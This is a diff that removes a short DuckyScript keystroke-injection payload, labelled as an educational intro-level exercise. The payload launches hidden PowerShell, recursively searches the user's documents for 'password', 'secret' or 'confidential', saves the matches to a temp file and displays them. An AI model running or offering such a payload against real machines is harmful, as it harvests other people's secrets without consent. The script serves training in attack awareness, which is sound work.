@@ -1,8 +1,0 @@
-REM CYBERFLIPPER - INTRO Level
-REM Local Metadata Discovery - Inspired by theHarvester
-REM Educational: Shows how local files can reveal sensitive keywords
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -W Hidden -C "Get-ChildItem -Path $env:USERPROFILE -Include *.doc,*.pdf,*.xls,*.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password|secret|confidential' | Select-Object -First 20 | Out-File $env:TEMP\discovery.txt; notepad $env:TEMP\discovery.txt"
-ENTER
